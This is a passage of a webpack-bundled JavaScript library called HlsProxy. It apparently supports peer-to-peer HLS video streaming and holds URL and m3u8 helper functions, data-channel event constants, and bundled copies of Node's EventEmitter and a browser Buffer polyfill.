(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else if(typeof exports === 'object')
		exports["HlsProxy"] = factory();
	else
		root["HlsProxy"] = factory();
})(typeof self !== 'undefined' ? self : this, function() {
return /******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "/src/";
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 18);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.noop = noop;
exports.getQueryParam = getQueryParam;
exports.updateQueryStringParam = updateQueryStringParam;
exports.getCurrentTs = getCurrentTs;
exports.randomNum = randomNum;
exports.calCheckPeersDelay = calCheckPeersDelay;
exports.performRangeRequest = performRangeRequest;
exports.navLang = navLang;
exports.dontWaitFor = dontWaitFor;
exports.timeout = timeout;
exports.getBrowserRTC = getBrowserRTC;
exports.copyBuffer = copyBuffer;
exports.getMaxSequence = getMaxSequence;

var _index = __webpack_require__(5);

var CHECK_PEERS_INTERVAL = 3; // 定时p2p下载的时间间隔 单位秒

function noop() {
    return true;
}

function getQueryParam(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
    var r = window.location.search.substr(1).match(reg);
    if (r != null && r[2] !== '') return r[2].toString();
    return '';
}

// 向url追加参数
function updateQueryStringParam(uri, key, value) {
    // if(!value) {
    //     return uri;
    // }
    var re = new RegExp("([?&])" + key + "=.*?(&|$)", "i");
    var separator = uri.indexOf('?') !== -1 ? "&" : "?";
    if (uri.match(re)) {
        return uri.replace(re, '$1' + key + "=" + value + '$2');
    } else {
        return uri + separator + key + "=" + value;
    }
}

// 获取当前时间戳 秒
function getCurrentTs() {

    return Date.parse(new Date()) / 1000;
}

// 生成从minNum到maxNum的随机数
function randomNum(minNum, maxNum) {
    return parseInt(Math.random() * (maxNum - minNum + 1) + minNum, 10);
}

// 计算check peers的delay
function calCheckPeersDelay(peerNum) {
    if (peerNum === 0) return CHECK_PEERS_INTERVAL;
    return 0.33 * peerNum + 0.67; // 假设最高下载peer数为10
}

// range探测
function performRangeRequest(uri) {
    var xhr = new XMLHttpRequest();
    return new Promise(function (resolve, reject) {
        xhr.open('GET', uri, true);
        xhr.responseType = 'arraybuffer';
        xhr.timeout = 3000;
        xhr.onload = function (event) {
            if (xhr.status === 206) {
                resolve();
            } else {
                reject();
            }
        };
        xhr.onerror = function (event) {
            reject();
        };
        xhr.ontimeout = function (event) {
            reject();
        };
        xhr.setRequestHeader('Range', 'bytes=0-0');
        xhr.send();
    });
}

// export function fetchRangeRequest(uri) {
//     return new Promise((resolve, reject) => {
//         fetch(uri, {
//             headers: {
//                 Range: 'bytes=0-0',
//             },
//         }).then(response => {
//             if (response.status === 206) {
//                 // CDN支持Range请求
//                 resolve();
//             } else {
//                 reject();
//             }
//         }).catch(err => {
//             reject();
//         })
//     })
// }

function navLang() {
    var lang = navigator.language || navigator.userLanguage; //常规浏览器语言和IE浏览器
    lang = lang.substr(0, 2); //截取lang前2位字符
    return lang === 'zh' ? 'cn' : 'en';
}

function dontWaitFor(promise) {
    // Effective no-op.
    promise.then(function () {});
}

function timeout(ms) {
    return new Promise(function (resolve) {
        return setTimeout(resolve, ms);
    });
}

function getBrowserRTC() {
    if (typeof window === 'undefined') return null;
    var wrtc = {
        RTCPeerConnection: window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection,
        RTCSessionDescription: window.RTCSessionDescription || window.mozRTCSessionDescription || window.webkitRTCSessionDescription,
        RTCIceCandidate: window.RTCIceCandidate || window.mozRTCIceCandidate || window.webkitRTCIceCandidate
    };
    if (!wrtc.RTCPeerConnection) return null;
    return wrtc;
}

function copyBuffer(source) {
    var payloadBuf = _index.Buffer.from(source);
    var targetBuffer = new _index.Buffer(source.byteLength);
    payloadBuf.copy(targetBuffer);
    return targetBuffer;
}

function getMaxSequence(m3u8) {
    var lines = m3u8.split('\n');
    var start = 0;
    var tsTag = '#EXTINF';
    var count = 0;
    var _iteratorNormalCompletion = true;
    var _didIteratorError = false;
    var _iteratorError = undefined;

    try {
        for (var _iterator = lines[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true) {
            var line = _step.value;

            var match = /^#EXT-X-MEDIA-SEQUENCE:?(\-?[0-9.]*)?/.exec(line);
            if (match) {
                if (match[1]) {
                    start = parseInt(match[1], 10);
                    break;
                }
            }
        }
    } catch (err) {
        _didIteratorError = true;
        _iteratorError = err;
    } finally {
        try {
            if (!_iteratorNormalCompletion && _iterator.return) {
                _iterator.return();
            }
        } finally {
            if (_didIteratorError) {
                throw _iteratorError;
            }
        }
    }

    var _iteratorNormalCompletion2 = true;
    var _didIteratorError2 = false;
    var _iteratorError2 = undefined;

    try {
        for (var _iterator2 = lines[Symbol.iterator](), _step2; !(_iteratorNormalCompletion2 = (_step2 = _iterator2.next()).done); _iteratorNormalCompletion2 = true) {
            var _line = _step2.value;

            if (_line.startsWith(tsTag)) {
                count++;
            }
        }
    } catch (err) {
        _didIteratorError2 = true;
        _iteratorError2 = err;
    } finally {
        try {
            if (!_iteratorNormalCompletion2 && _iterator2.return) {
                _iterator2.return();
            }
        } finally {
            if (_didIteratorError2) {
                throw _iteratorError2;
            }
        }
    }

    return start + count - 1;
}

/***/ }),
/* 1 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";
// Copyright Joyent, Inc. and other Node contributors.
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the
// "Software"), to deal in the Software without restriction, including
// without limitation the rights to use, copy, modify, merge, publish,
// distribute, sublicense, and/or sell copies of the Software, and to permit
// persons to whom the Software is furnished to do so, subject to the
// following conditions:
//
// The above copyright notice and this permission notice shall be included
// in all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
// OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN
// NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
// DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR
// OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE
// USE OR OTHER DEALINGS IN THE SOFTWARE.



var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

var R = (typeof Reflect === 'undefined' ? 'undefined' : _typeof(Reflect)) === 'object' ? Reflect : null;
var ReflectApply = R && typeof R.apply === 'function' ? R.apply : function ReflectApply(target, receiver, args) {
  return Function.prototype.apply.call(target, receiver, args);
};

var ReflectOwnKeys;
if (R && typeof R.ownKeys === 'function') {
  ReflectOwnKeys = R.ownKeys;
} else if (Object.getOwnPropertySymbols) {
  ReflectOwnKeys = function ReflectOwnKeys(target) {
    return Object.getOwnPropertyNames(target).concat(Object.getOwnPropertySymbols(target));
  };
} else {
  ReflectOwnKeys = function ReflectOwnKeys(target) {
    return Object.getOwnPropertyNames(target);
  };
}

function ProcessEmitWarning(warning) {
  if (console && console.warn) console.warn(warning);
}

var NumberIsNaN = Number.isNaN || function NumberIsNaN(value) {
  return value !== value;
};

function EventEmitter() {
  EventEmitter.init.call(this);
}
module.exports = EventEmitter;
module.exports.once = once;

// Backwards-compat with node 0.10.x
EventEmitter.EventEmitter = EventEmitter;

EventEmitter.prototype._events = undefined;
EventEmitter.prototype._eventsCount = 0;
EventEmitter.prototype._maxListeners = undefined;

// By default EventEmitters will print a warning if more than 10 listeners are
// added to it. This is a useful default which helps finding memory leaks.
var defaultMaxListeners = 10;

function checkListener(listener) {
  if (typeof listener !== 'function') {
    throw new TypeError('The "listener" argument must be of type Function. Received type ' + (typeof listener === 'undefined' ? 'undefined' : _typeof(listener)));
  }
}

Object.defineProperty(EventEmitter, 'defaultMaxListeners', {
  enumerable: true,
  get: function get() {
    return defaultMaxListeners;
  },
  set: function set(arg) {
    if (typeof arg !== 'number' || arg < 0 || NumberIsNaN(arg)) {
      throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received ' + arg + '.');
    }
    defaultMaxListeners = arg;
  }
});

EventEmitter.init = function () {

  if (this._events === undefined || this._events === Object.getPrototypeOf(this)._events) {
    this._events = Object.create(null);
    this._eventsCount = 0;
  }

  this._maxListeners = this._maxListeners || undefined;
};

// Obviously not all Emitters should be limited to 10. This function allows
// that to be increased. Set to zero for unlimited.
EventEmitter.prototype.setMaxListeners = function setMaxListeners(n) {
  if (typeof n !== 'number' || n < 0 || NumberIsNaN(n)) {
    throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received ' + n + '.');
  }
  this._maxListeners = n;
  return this;
};

function _getMaxListeners(that) {
  if (that._maxListeners === undefined) return EventEmitter.defaultMaxListeners;
  return that._maxListeners;
}

EventEmitter.prototype.getMaxListeners = function getMaxListeners() {
  return _getMaxListeners(this);
};

EventEmitter.prototype.emit = function emit(type) {
  var args = [];
  for (var i = 1; i < arguments.length; i++) {
    args.push(arguments[i]);
  }var doError = type === 'error';

  var events = this._events;
  if (events !== undefined) doError = doError && events.error === undefined;else if (!doError) return false;

  // If there is no 'error' event listener then throw.
  if (doError) {
    var er;
    if (args.length > 0) er = args[0];
    if (er instanceof Error) {
      // Note: The comments on the `throw` lines are intentional, they show
      // up in Node's output if this results in an unhandled exception.
      throw er; // Unhandled 'error' event
    }
    // At least give some kind of context to the user
    var err = new Error('Unhandled error.' + (er ? ' (' + er.message + ')' : ''));
    err.context = er;
    throw err; // Unhandled 'error' event
  }

  var handler = events[type];

  if (handler === undefined) return false;

  if (typeof handler === 'function') {
    ReflectApply(handler, this, args);
  } else {
    var len = handler.length;
    var listeners = arrayClone(handler, len);
    for (var i = 0; i < len; ++i) {
      ReflectApply(listeners[i], this, args);
    }
  }

  return true;
};

function _addListener(target, type, listener, prepend) {
  var m;
  var events;
  var existing;

  checkListener(listener);

  events = target._events;
  if (events === undefined) {
    events = target._events = Object.create(null);
    target._eventsCount = 0;
  } else {
    // To avoid recursion in the case that type === "newListener"! Before
    // adding it to the listeners, first emit "newListener".
    if (events.newListener !== undefined) {
      target.emit('newListener', type, listener.listener ? listener.listener : listener);

      // Re-assign `events` because a newListener handler could have caused the
      // this._events to be assigned to a new object
      events = target._events;
    }
    existing = events[type];
  }

  if (existing === undefined) {
    // Optimize the case of one listener. Don't need the extra array object.
    existing = events[type] = listener;
    ++target._eventsCount;
  } else {
    if (typeof existing === 'function') {
      // Adding the second element, need to change to array.
      existing = events[type] = prepend ? [listener, existing] : [existing, listener];
      // If we've already got an array, just append.
    } else if (prepend) {
      existing.unshift(listener);
    } else {
      existing.push(listener);
    }

    // Check for listener leak
    m = _getMaxListeners(target);
    if (m > 0 && existing.length > m && !existing.warned) {
      existing.warned = true;
      // No error code for this since it is a Warning
      // eslint-disable-next-line no-restricted-syntax
      var w = new Error('Possible EventEmitter memory leak detected. ' + existing.length + ' ' + String(type) + ' listeners ' + 'added. Use emitter.setMaxListeners() to ' + 'increase limit');
      w.name = 'MaxListenersExceededWarning';
      w.emitter = target;
      w.type = type;
      w.count = existing.length;
      ProcessEmitWarning(w);
    }
  }

  return target;
}

EventEmitter.prototype.addListener = function addListener(type, listener) {
  return _addListener(this, type, listener, false);
};

EventEmitter.prototype.on = EventEmitter.prototype.addListener;

EventEmitter.prototype.prependListener = function prependListener(type, listener) {
  return _addListener(this, type, listener, true);
};

function onceWrapper() {
  if (!this.fired) {
    this.target.removeListener(this.type, this.wrapFn);
    this.fired = true;
    if (arguments.length === 0) return this.listener.call(this.target);
    return this.listener.apply(this.target, arguments);
  }
}

function _onceWrap(target, type, listener) {
  var state = { fired: false, wrapFn: undefined, target: target, type: type, listener: listener };
  var wrapped = onceWrapper.bind(state);
  wrapped.listener = listener;
  state.wrapFn = wrapped;
  return wrapped;
}

EventEmitter.prototype.once = function once(type, listener) {
  checkListener(listener);
  this.on(type, _onceWrap(this, type, listener));
  return this;
};

EventEmitter.prototype.prependOnceListener = function prependOnceListener(type, listener) {
  checkListener(listener);
  this.prependListener(type, _onceWrap(this, type, listener));
  return this;
};

// Emits a 'removeListener' event if and only if the listener was removed.
EventEmitter.prototype.removeListener = function removeListener(type, listener) {
  var list, events, position, i, originalListener;

  checkListener(listener);

  events = this._events;
  if (events === undefined) return this;

  list = events[type];
  if (list === undefined) return this;

  if (list === listener || list.listener === listener) {
    if (--this._eventsCount === 0) this._events = Object.create(null);else {
      delete events[type];
      if (events.removeListener) this.emit('removeListener', type, list.listener || listener);
    }
  } else if (typeof list !== 'function') {
    position = -1;

    for (i = list.length - 1; i >= 0; i--) {
      if (list[i] === listener || list[i].listener === listener) {
        originalListener = list[i].listener;
        position = i;
        break;
      }
    }

    if (position < 0) return this;

    if (position === 0) list.shift();else {
      spliceOne(list, position);
    }

    if (list.length === 1) events[type] = list[0];

    if (events.removeListener !== undefined) this.emit('removeListener', type, originalListener || listener);
  }

  return this;
};

EventEmitter.prototype.off = EventEmitter.prototype.removeListener;

EventEmitter.prototype.removeAllListeners = function removeAllListeners(type) {
  var listeners, events, i;

  events = this._events;
  if (events === undefined) return this;

  // not listening for removeListener, no need to emit
  if (events.removeListener === undefined) {
    if (arguments.length === 0) {
      this._events = Object.create(null);
      this._eventsCount = 0;
    } else if (events[type] !== undefined) {
      if (--this._eventsCount === 0) this._events = Object.create(null);else delete events[type];
    }
    return this;
  }

  // emit removeListener for all listeners on all events
  if (arguments.length === 0) {
    var keys = Object.keys(events);
    var key;
    for (i = 0; i < keys.length; ++i) {
      key = keys[i];
      if (key === 'removeListener') continue;
      this.removeAllListeners(key);
    }
    this.removeAllListeners('removeListener');
    this._events = Object.create(null);
    this._eventsCount = 0;
    return this;
  }

  listeners = events[type];

  if (typeof listeners === 'function') {
    this.removeListener(type, listeners);
  } else if (listeners !== undefined) {
    // LIFO order
    for (i = listeners.length - 1; i >= 0; i--) {
      this.removeListener(type, listeners[i]);
    }
  }

  return this;
};

function _listeners(target, type, unwrap) {
  var events = target._events;

  if (events === undefined) return [];

  var evlistener = events[type];
  if (evlistener === undefined) return [];

  if (typeof evlistener === 'function') return unwrap ? [evlistener.listener || evlistener] : [evlistener];

  return unwrap ? unwrapListeners(evlistener) : arrayClone(evlistener, evlistener.length);
}

EventEmitter.prototype.listeners = function listeners(type) {
  return _listeners(this, type, true);
};

EventEmitter.prototype.rawListeners = function rawListeners(type) {
  return _listeners(this, type, false);
};

EventEmitter.listenerCount = function (emitter, type) {
  if (typeof emitter.listenerCount === 'function') {
    return emitter.listenerCount(type);
  } else {
    return listenerCount.call(emitter, type);
  }
};

EventEmitter.prototype.listenerCount = listenerCount;
function listenerCount(type) {
  var events = this._events;

  if (events !== undefined) {
    var evlistener = events[type];

    if (typeof evlistener === 'function') {
      return 1;
    } else if (evlistener !== undefined) {
      return evlistener.length;
    }
  }

  return 0;
}

EventEmitter.prototype.eventNames = function eventNames() {
  return this._eventsCount > 0 ? ReflectOwnKeys(this._events) : [];
};

function arrayClone(arr, n) {
  var copy = new Array(n);
  for (var i = 0; i < n; ++i) {
    copy[i] = arr[i];
  }return copy;
}

function spliceOne(list, index) {
  for (; index + 1 < list.length; index++) {
    list[index] = list[index + 1];
  }list.pop();
}

function unwrapListeners(arr) {
  var ret = new Array(arr.length);
  for (var i = 0; i < ret.length; ++i) {
    ret[i] = arr[i].listener || arr[i];
  }
  return ret;
}

function once(emitter, name) {
  return new Promise(function (resolve, reject) {
    function eventListener() {
      if (errorListener !== undefined) {
        emitter.removeListener('error', errorListener);
      }
      resolve([].slice.call(arguments));
    };
    var errorListener;

    // Adding an error listener is not optional because
    // if an error is thrown on an event emitter we cannot
    // guarantee that the actual event we are waiting will
    // be fired. The result could be a silent way to create
    // memory or file descriptor leaks, which is something
    // we should avoid.
    if (name !== 'error') {
      errorListener = function errorListener(err) {
        emitter.removeListener(name, eventListener);
        reject(err);
      };

      emitter.once('error', errorListener);
    }

    emitter.once(name, eventListener);
  });
}

/***/ }),
/* 2 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});
/**
 * Created by xieting on 2018/4/3.
 */

exports.default = {
    //data-channel
    // DC_PING: 'PING',
    // DC_PONG: 'PONG',
    DC_SIGNAL: 'SIGNAL',
    DC_OPEN: 'OPEN',
    DC_REQUEST: 'REQUEST',
    DC_PIECE_NOT_FOUND: 'PIECE_NOT_FOUND', // 当请求的数据找不到时触发
    DC_PIECE_ABORT: 'PIECE_ABORT',
    DC_CLOSE: 'CLOSE',
    DC_RESPONSE: 'RESPONSE',
    DC_ERROR: 'ERROR',
    DC_PIECE: "PIECE",
    DC_TIMEOUT: "TIMEOUT",
    DC_PIECE_ACK: "PIECE_ACK",
    DC_METADATA: "METADATA",
    DC_PLAT_ANDROID: "ANDROID",
    DC_PLAT_IOS: "IOS",
    DC_PLAT_WEB: "WEB",
    DC_CHOKE: "CHOKE",
    DC_UNCHOKE: "UNCHOKE",
    // DC_INTERESTED: "INTERESTED",
    // DC_NOTINTERESTED: "NOT_INTERESTED",
    DC_HAVE: "HAVE",
    DC_LOST: "LOST",
    DC_GET_PEERS: "GET_PEERS",
    DC_PEERS: "PEERS",
    DC_STATS: "STATS",
    DC_SUBSCRIBE: "SUBSCRIBE",
    DC_UNSUBSCRIBE: "UNSUBSCRIBE",
    DC_SUBSCRIBE_ACCEPT: "SUBSCRIBE_ACCEPT",
    DC_SUBSCRIBE_REJECT: "SUBSCRIBE_REJECT",
    DC_SUBSCRIBE_LEVEL: "SUBSCRIBE_LEVEL",
    DC_PEER_SIGNAL: "PEER_SIGNAL",
    DC_PLAYLIST: "PLAYLIST",

    //buffer-manager
    BM_LOST: 'lost',
    BM_ADDED_SEG_: 'BM_ADDED_SEG_',
    BM_ADDED_SN_: 'BM_ADDED_SN_',
    BM_SEG_ADDED: 'BM_SEG_ADDED',

    // engine
    FRAG_CHANGED: 'FRAG_CHANGED',
    FRAG_LOADED: 'FRAG_LOADED',
    FRAG_LOADING: 'FRAG_LOADING',
    RESTART_P2P: 'RESTART_P2P',

    EXCEPTION: "exception"
};
module.exports = exports['default'];

/***/ }),
/* 3 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";

/*
    method: concat
 */

/*
 method: from
 */

/*
 method: copy
 */

/*!
 * The buffer module from node.js, for the browser.
 *
 * @author   Feross Aboukhadijeh <https://feross.org>
 * @license  MIT
 */
/* eslint-disable no-proto */



var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

exports.Buffer = Buffer;

var K_MAX_LENGTH = 0x7fffffff;
exports.kMaxLength = K_MAX_LENGTH;

/**
 * If `Buffer.TYPED_ARRAY_SUPPORT`:
 *   === true    Use Uint8Array implementation (fastest)
 *   === false   Print warning and recommend using `buffer` v4.x which has an Object
 *               implementation (most compatible, even IE6)
 *
 * Browsers that support typed arrays are IE 10+, Firefox 4+, Chrome 7+, Safari 5.1+,
 * Opera 11.6+, iOS 4.2+.
 *
 * We report that the browser does not support typed arrays if the are not subclassable
 * using __proto__. Firefox 4-29 lacks support for adding new properties to `Uint8Array`
 * (See: https://bugzilla.mozilla.org/show_bug.cgi?id=695438). IE 10 lacks support
 * for __proto__ and has a buggy typed array implementation.
 */
Buffer.TYPED_ARRAY_SUPPORT = typedArraySupport();

if (!Buffer.TYPED_ARRAY_SUPPORT && typeof console !== 'undefined' && typeof console.error === 'function') {
    console.error('This browser lacks typed array (Uint8Array) support which is required by ' + '`buffer` v5.x. Use `buffer` v4.x if you require old browser support.');
}

function typedArraySupport() {
    // Can typed array instances can be augmented?
    try {
        var arr = new Uint8Array(1);
        arr.__proto__ = { __proto__: Uint8Array.prototype, foo: function foo() {
                return 42;
            } };
        return arr.foo() === 42;
    } catch (e) {
        return false;
    }
}

function createBuffer(length) {
    if (length > K_MAX_LENGTH) {
        throw new RangeError('The value "' + length + '" is invalid for option "size"');
    }
    // Return an augmented `Uint8Array` instance
    var buf = new Uint8Array(length);
    buf.__proto__ = Buffer.prototype;
    return buf;
}

/**
 * The Buffer constructor returns instances of `Uint8Array` that have their
 * prototype changed to `Buffer.prototype`. Furthermore, `Buffer` is a subclass of
 * `Uint8Array`, so the returned instances will have all the node `Buffer` methods
 * and the `Uint8Array` methods. Square bracket notation works as expected -- it
 * returns a single octet.
 *
 * The `Uint8Array` prototype remains unmodified.
 */

function Buffer(arg, encodingOrOffset, length) {
    // Common case.
    if (typeof arg === 'number') {
        if (typeof encodingOrOffset === 'string') {
            throw new TypeError('The "string" argument must be of type string. Received type number');
        }
        return allocUnsafe(arg);
    }
    return from(arg, encodingOrOffset, length);
}

// Fix subarray() in ES2016. See: https://github.com/feross/buffer/pull/97
if (typeof Symbol !== 'undefined' && Symbol.species != null && Buffer[Symbol.species] === Buffer) {
    Object.defineProperty(Buffer, Symbol.species, {
        value: null,
        configurable: true,
        enumerable: false,
        writable: false
    });
}

// Buffer.poolSize = 8192 // not used by this implementation

function from(value, encodingOrOffset, length) {
    if (typeof value === 'string') {
        return fromString(value, encodingOrOffset);
    }

    if (ArrayBuffer.isView(value)) {
        return fromArrayLike(value);
    }

    if (value == null) {
        throw TypeError('The first argument must be one of type string, Buffer, ArrayBuffer, Array, ' + 'or Array-like Object. Received type ' + (typeof value === 'undefined' ? 'undefined' : _typeof(value)));
    }

    if (isInstance(value, ArrayBuffer) || value && isInstance(value.buffer, ArrayBuffer)) {
        return fromArrayBuffer(value, encodingOrOffset, length);
    }

    if (typeof value === 'number') {
        throw new TypeError('The "value" argument must not be of type number. Received type number');
    }

    var valueOf = value.valueOf && value.valueOf();
    if (valueOf != null && valueOf !== value) {
        return Buffer.from(valueOf, encodingOrOffset, length);
    }

    var b = fromObject(value);
    if (b) return b;

    if (typeof Symbol !== 'undefined' && Symbol.toPrimitive != null && typeof value[Symbol.toPrimitive] === 'function') {
        return Buffer.from(value[Symbol.toPrimitive]('string'), encodingOrOffset, length);
    }

    throw new TypeError('The first argument must be one of type string, Buffer, ArrayBuffer, Array, ' + 'or Array-like Object. Received type ' + (typeof value === 'undefined' ? 'undefined' : _typeof(value)));
}

/**
 * Functionally equivalent to Buffer(arg, encoding) but throws a TypeError
 * if value is a number.
 * Buffer.from(str[, encoding])
 * Buffer.from(array)
 * Buffer.from(buffer)
 * Buffer.from(arrayBuffer[, byteOffset[, length]])
 **/
Buffer.from = function (value, encodingOrOffset, length) {
    return from(value, encodingOrOffset, length);
};

// Note: Change prototype *after* Buffer.from is defined to workaround Chrome bug:
// https://github.com/feross/buffer/pull/148
Buffer.prototype.__proto__ = Uint8Array.prototype;
Buffer.__proto__ = Uint8Array;

function assertSize(size) {
    if (typeof size !== 'number') {
        throw new TypeError('"size" argument must be of type number');
    } else if (size < 0) {
        throw new RangeError('The value "' + size + '" is invalid for option "size"');
    }
}

function alloc(size, fill, encoding) {
    assertSize(size);
    if (size <= 0) {
        return createBuffer(size);
    }
    if (fill !== undefined) {
        // Only pay attention to encoding if it's a string. This
        // prevents accidentally sending in a number that would
        // be interpretted as a start offset.
        return typeof encoding === 'string' ? createBuffer(size).fill(fill, encoding) : createBuffer(size).fill(fill);
    }
    return createBuffer(size);
}

/**
 * Creates a new filled Buffer instance.
 * alloc(size[, fill[, encoding]])
 **/
Buffer.alloc = function (size, fill, encoding) {
    return alloc(size, fill, encoding);
};

function allocUnsafe(size) {
    assertSize(size);
    return createBuffer(size < 0 ? 0 : checked(size) | 0);
}

/**
 * Equivalent to Buffer(num), by default creates a non-zero-filled Buffer instance.
 * */
Buffer.allocUnsafe = function (size) {
    return allocUnsafe(size);
};
/**
 * Equivalent to SlowBuffer(num), by default creates a non-zero-filled Buffer instance.
 */
// Buffer.allocUnsafeSlow = function (size) {
//     return allocUnsafe(size)
// }

function fromString(string, encoding) {
    if (typeof encoding !== 'string' || encoding === '') {
        encoding = 'utf8';
    }

    if (!Buffer.isEncoding(encoding)) {
        throw new TypeError('Unknown encoding: ' + encoding);
    }

    var length = byteLength(string, encoding) | 0;
    var buf = createBuffer(length);

    var actual = buf.write(string, encoding);

    if (actual !== length) {
        // Writing a hex string, for example, that contains invalid characters will
        // cause everything after the first invalid character to be ignored. (e.g.
        // 'abxxcd' will be treated as 'ab')
        buf = buf.slice(0, actual);
    }

    return buf;
}

function fromArrayLike(array) {
    var length = array.length < 0 ? 0 : checked(array.length) | 0;
    var buf = createBuffer(length);
    for (var i = 0; i < length; i += 1) {
        buf[i] = array[i] & 255;
    }
    return buf;
}

function fromArrayBuffer(array, byteOffset, length) {
    if (byteOffset < 0 || array.byteLength < byteOffset) {
        throw new RangeError('"offset" is outside of buffer bounds');
    }

    if (array.byteLength < byteOffset + (length || 0)) {
        throw new RangeError('"length" is outside of buffer bounds');
    }

    var buf;
    if (byteOffset === undefined && length === undefined) {
        buf = new Uint8Array(array);
    } else if (length === undefined) {
        buf = new Uint8Array(array, byteOffset);
    } else {
        buf = new Uint8Array(array, byteOffset, length);
    }

    // Return an augmented `Uint8Array` instance
    buf.__proto__ = Buffer.prototype;
    return buf;
}

function fromObject(obj) {
    if (Buffer.isBuffer(obj)) {
        var len = checked(obj.length) | 0;
        var buf = createBuffer(len);

        if (buf.length === 0) {
            return buf;
        }

        obj.copy(buf, 0, 0, len);
        return buf;
    }

    if (obj.length !== undefined) {
        if (typeof obj.length !== 'number' || numberIsNaN(obj.length)) {
            return createBuffer(0);
        }
        return fromArrayLike(obj);
    }

    if (obj.type === 'Buffer' && Array.isArray(obj.data)) {
        return fromArrayLike(obj.data);
    }
}

function checked(length) {
    // Note: cannot use `length < K_MAX_LENGTH` here because that fails when
    // length is NaN (which is otherwise coerced to zero.)
    if (length >= K_MAX_LENGTH) {
        throw new RangeError('Attempt to allocate Buffer larger than maximum ' + 'size: 0x' + K_MAX_LENGTH.toString(16) + ' bytes');
    }
    return length | 0;
}

Buffer.isBuffer = function isBuffer(b) {
    return b != null && b._isBuffer === true && b !== Buffer.prototype; // so Buffer.isBuffer(Buffer.prototype) will be false
};

Buffer.isEncoding = function isEncoding(encoding) {
    switch (String(encoding).toLowerCase()) {
        case 'hex':
        case 'utf8':
        case 'utf-8':
        case 'ascii':
        case 'latin1':
        case 'binary':
        case 'base64':
        case 'ucs2':
        case 'ucs-2':
        case 'utf16le':
        case 'utf-16le':
            return true;
        default:
            return false;
    }
};

Buffer.concat = function concat(list, length) {
    if (!Array.isArray(list)) {
        throw new TypeError('"list" argument must be an Array of Buffers');
    }

    if (list.length === 0) {
        return Buffer.alloc(0);
    }

    var i;
    if (length === undefined) {
        length = 0;
        for (i = 0; i < list.length; ++i) {
            length += list[i].length;
        }
    }

    var buffer = Buffer.allocUnsafe(length);
    var pos = 0;
    for (i = 0; i < list.length; ++i) {
        var buf = list[i];
        if (isInstance(buf, Uint8Array)) {
            buf = Buffer.from(buf);
        }
        if (!Buffer.isBuffer(buf)) {
            throw new TypeError('"list" argument must be an Array of Buffers');
        }
        buf.copy(buffer, pos);
        pos += buf.length;
    }
    return buffer;
};

function byteLength(string, encoding) {
    if (Buffer.isBuffer(string)) {
        return string.length;
    }
    if (ArrayBuffer.isView(string) || isInstance(string, ArrayBuffer)) {
        return string.byteLength;
    }
    if (typeof string !== 'string') {
